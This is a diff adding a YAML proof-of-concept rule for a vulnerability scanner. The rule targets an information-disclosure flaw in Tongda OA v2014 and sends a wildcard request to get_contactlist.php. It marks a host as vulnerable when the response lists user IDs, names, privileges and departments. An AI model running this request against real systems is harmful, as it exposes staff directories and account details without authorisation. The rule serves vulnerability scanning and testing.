@@ -1,0 +1,15 @@
+name: poc-yaml-tongda-v2014-get-contactlist-disclosure
+manual: true
+transport: http
+rules:
+  r0:
+    request:
+      cache: true
+      method: GET
+      path: /mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3
+    expression: response.status == 200 && response.body.bcontains(b'"user_uid":') && response.body.bcontains(b'"user_name":') && response.body.bcontains(b'"priv_name":') && response.body.bcontains(b'"dept_name":')
+expression: r0()
+detail:
+  author: klear
+  links:
+    - https://vuls.info/PeiQi/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v2014%20get_contactlist.php%20%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/?h=contactlist#_4
